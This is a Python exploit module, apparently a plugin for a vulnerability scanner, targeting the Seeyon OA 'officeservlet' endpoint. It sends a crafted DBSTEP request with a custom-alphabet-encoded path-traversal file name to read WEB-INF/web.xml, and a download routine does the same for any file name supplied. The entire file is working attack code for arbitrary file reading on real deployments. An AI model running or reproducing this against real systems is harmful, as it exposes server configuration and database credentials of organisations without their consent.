#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from lib.util.cipherutil import base64encode
from script import BaseScript

class Script(BaseScript):

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB


    async def prove(self):
        if self.base_url:
            table = 'gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6'
            base64_file = str(base64encode('./../webapps/seeyon/WEB-INF/web.xml', table))
            url = self.base_url + 'seeyon/officeservlet'
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            async with ClientSession() as session:
                async with session.get(url=url) as response:
                    if response !=None:
                        text = await response.text()
                        if 'DBSTEP V3.0' in text:
                            data = '''DBSTEP V3.0     331             0               0               \r\ncurrentUserId=ziCEz4eEz4KuzUK3ziKGwUdszg66\r\nRECORDID=wLKhwLK6\r\nCREATEDATE=wLShwUgsP4o3Pg66\r\noriginalFileId=wV66\r\nneedReadFile=NrMGyV66\r\noriginalCreateDate=wLShwUgsP4o3Pg66\r\nOPTION=LKDxOWOWLlxwVlOW\r\nCOMMAND=BSTLOlMSOCQwOV66\r\nTEMPLATE={}\r\naffairMemberId=wV66\r\naffairMemberName=OKlzLs66'''.format(base64_file)
                            async with session.post(url=url, data = data, headers=headers) as response:
                                if response!=None:
                                    text = await response.text()
                                    if '<res-type>javax.sql.DataSource</res-type>' in text:
                                        yield url

    async def download(self):
        if self.base_url:
            fn = self.parameter['file']
            table = 'gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6'
            base64_file = str(base64encode(fn, table))
            url = self.base_url + 'seeyon/officeservlet'
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            async with ClientSession() as session:
                async with session.get(url=url) as response:
                    if response !=None:
                        text = await response.text()
                        if 'DBSTEP V3.0' in text:
                            data = '''DBSTEP V3.0     331             0               0               \r\ncurrentUserId=ziCEz4eEz4KuzUK3ziKGwUdszg66\r\nRECORDID=wLKhwLK6\r\nCREATEDATE=wLShwUgsP4o3Pg66\r\noriginalFileId=wV66\r\nneedReadFile=NrMGyV66\r\noriginalCreateDate=wLShwUgsP4o3Pg66\r\nOPTION=LKDxOWOWLlxwVlOW\r\nCOMMAND=BSTLOlMSOCQwOV66\r\nTEMPLATE={}\r\naffairMemberId=wV66\r\naffairMemberName=OKlzLs66'''.format(base64_file)
                            async with session.post(url=url, data = data, headers=headers) as response:
                                if response!=None:
                                    text = await response.text()
                                    if '<res-type>javax.sql.DataSource</res-type>' in text:
                                        yield url